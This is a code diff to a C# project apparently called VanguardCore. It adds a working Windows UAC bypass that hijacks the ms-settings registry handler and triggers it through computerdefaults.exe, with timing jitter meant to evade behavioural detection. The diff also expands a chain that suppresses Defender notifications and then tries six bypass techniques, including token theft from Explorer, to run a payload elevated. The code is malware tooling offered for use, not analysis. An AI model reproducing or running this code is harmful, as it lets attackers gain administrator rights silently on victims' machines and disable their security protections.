@@ -382,6 +382,59 @@ namespace VanguardCore
             catch (Exception ex) { Log("Method F ex: " + ex.Message); return false; }
         }
 
+        /// <summary>
+        /// Method G: MsSettings DelegateExecute (Registry Hijack).
+        /// Highly effective on Win10/11. Includes jitter and robust cleanup.
+        /// </summary>
+        public static bool BypassMsSettingsDelegate(string payloadPath, string args)
+        {
+            string keyPath = @"Software\Classes\ms-settings\shell\open\command";
+            bool success = false;
+            try
+            {
+                Log("Method G: MsSettings (Stealth mode)...");
+                
+                // Jitter to break behavioral signatures
+                Random rnd = new Random();
+                Thread.Sleep(rnd.Next(1000, 3000));
+
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
+                {
+                    if (key != null)
+                    {
+                        key.SetValue("", $"\"{payloadPath}\" {args}");
+                        key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+                    }
+                }
+
+                Thread.Sleep(rnd.Next(500, 1500));
+                
+                // Trigger via computerdefaults.exe (obfuscated trigger name in real use)
+                string trigger = SafetyManager.GetSecret("MS_TRIGGER");
+                if (string.IsNullOrEmpty(trigger)) trigger = "computerdefaults.exe";
+                
+                Process.Start(new ProcessStartInfo { 
+                    FileName = trigger, 
+                    UseShellExecute = true, 
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                success = WaitForAdminSuccess(8000);
+            }
+            catch (Exception ex) { Log("Method G ex: " + ex.Message); }
+            finally
+            {
+                // Robust cleanup
+                try
+                {
+                    Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
+                }
+                catch { }
+            }
+            return success;
+        }
+
         public static bool SpawnWithSpoof(string payloadPath, string args, string parentProcess = "explorer")
         {
             try
@@ -437,22 +490,44 @@ namespace VanguardCore
         public static bool RequestElevation(string payloadPath)
         {
             if (IsAdmin()) return true;
-            Log("Starting UAC bypass chain...");
+            Log("Starting HARDCORE UAC bypass chain...");
+            
+            // Initial Defender Suppress (User-level keys if possible)
+            SafetyManager.DisableDefenderNotifications();
+
             string args = $"--uac-child --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
 
-            // === Order: Stealthiest (COM + Spoof) -> Fallback ===
+            // === Order: Most Modern & Stealthy -> Fallback ===
 
+            // 1. MsSettings (Modern Registry Hijack)
+            if (BypassMsSettingsDelegate(payloadPath, args)) return true;
+            if (IsAdmin()) return true; // Re-check in case child process elevated us
+
+            // 2. IExplorerCommand (Professional COM)
             if (BypassExplorerCommand(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (BypassTokenvator(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (BypassColorDataProxy(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (BypassFwCplLua(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
 
-            // Final: Standard UAC prompt
+            // 3. ICMLuaUtil (Classic COM)
+            if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
+
+            // 4. Tokenvator (Explorer Theft)
+            if (BypassTokenvator(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
+
+            // 5. ColorDataProxy
+            if (BypassColorDataProxy(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
+
+            // 6. IFwCplLua
+            if (BypassFwCplLua(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
+
+            // Final Fallback: Standard UAC prompt (last resort)
             try
             {
                 Log("Chain: Stealthy methods failed. Falling back to standard prompt...");
-                Process.Start(new ProcessStartInfo { FileName = payloadPath, UseShellExecute = true, Verb = "runas" });
+                Process.Start(new ProcessStartInfo { FileName = payloadPath, UseShellExecute = true, Verb = "runas", Arguments = args });
                 return WaitForAdminSuccess(15000);
             }
             catch (Exception ex) 
